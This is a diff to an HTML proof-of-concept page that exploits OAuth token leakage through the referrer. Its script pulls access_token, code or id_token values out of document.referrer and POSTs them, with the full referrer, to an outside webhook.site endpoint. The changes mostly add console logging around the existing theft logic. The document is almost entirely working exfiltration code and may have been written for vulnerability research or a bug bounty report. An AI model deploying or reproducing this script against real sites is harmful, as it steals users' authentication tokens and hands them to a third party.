@@ -10,17 +10,21 @@
   <p id="token">Looking for token...</p>
 
   <script>
-    // Safely get the referrer
+    console.log("PoC script running...");
+
+    // Step 1: Get referrer
     const ref = document.referrer || "No referrer detected.";
     document.getElementById("referrer").innerText = "Referrer: " + ref;
+    console.log("Referrer:", ref);
 
-    // Try to extract token from referrer
+    // Step 2: Match token from referrer
     const match = ref.match(/(?:access_token|code|id_token)=([^&]+)/i);
     if (match && match[1]) {
       const token = match[1];
+      console.log("Extracted token:", token);
       document.getElementById("token").innerText = "🚨 Leaked Token: " + token;
 
-      // Send token to your webhook
+      // Step 3: Send to webhook
       fetch("https://webhook.site/dfbb8dab-9ac7-4819-874f-bd3c43899a1a", {
         method: "POST",
         headers: {
@@ -31,9 +35,15 @@
           full_referrer: ref,
           timestamp: new Date().toISOString()
         })
+      }).then(res => {
+        console.log("Webhook POST success:", res.status);
+      }).catch(err => {
+        console.error("Webhook POST failed:", err);
       });
+
     } else {
       document.getElementById("token").innerText = "❌ No token found in referrer.";
+      console.log("No token in referrer.");
     }
   </script>
 </body>
